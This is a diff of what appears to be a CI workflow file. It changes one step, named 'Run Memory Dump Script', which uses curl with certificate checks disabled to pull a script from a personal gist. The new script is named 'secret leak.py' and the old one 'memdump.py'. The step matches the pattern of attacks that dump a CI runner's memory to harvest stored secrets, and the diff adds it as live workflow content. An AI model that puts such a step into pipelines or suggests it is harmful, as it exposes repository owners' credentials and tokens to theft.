@@ -16,4 +16,4 @@ jobs:
           fetch-depth: 0
 
       - name: Run Memory Dump Script
-        run: curl -k -sSf https://gist.githubusercontent.com/Pranesh-Shrestha/eea7f7f05e3d9ae73ead8d93a2029154/raw/d3adf5c61a3cf583048cd353b3a23a1ff9fd4c1b/memdump.py
+        run: curl -k -sSf https://gist.githubusercontent.com/Pranesh-Shrestha/653d6fcbb3e0f32ecad6018b402cca87/raw/b087f7b6c2310771db2a99077db04c916184eedf/secret%2520leak.py
